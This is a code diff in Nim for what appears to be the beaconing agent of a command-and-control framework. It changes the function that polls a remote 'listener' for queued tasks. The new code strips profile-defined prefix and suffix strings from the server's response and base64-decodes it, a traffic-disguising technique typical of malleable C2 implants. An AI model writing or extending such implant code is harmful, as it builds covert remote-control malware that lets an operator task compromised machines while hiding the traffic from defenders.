@@ -48,8 +48,24 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        return waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint[0..^2]}")
+        let responseBody = waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint[0..^2]}")
     
+        # Return if no tasks are queued
+        if responseBody.len <= 0: 
+            return ""
+
+        # In case that tasks are found, apply data transformation to server's response body to get thr raw data
+        let 
+            prefix = ctx.profile.getString("http-get.server.output.prefix")
+            suffix = ctx.profile.getString("http-get.server.output.suffix")
+            encResponse = responseBody[len(prefix) ..^ len(suffix) + 1]
+
+        case ctx.profile.getString("http-get.server.output.encoding.type", default = "none"): 
+        of "base64":
+            return decode(encResponse) 
+        of "none":
+            return encResponse 
+
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
         echo "[-] " & err.msg 
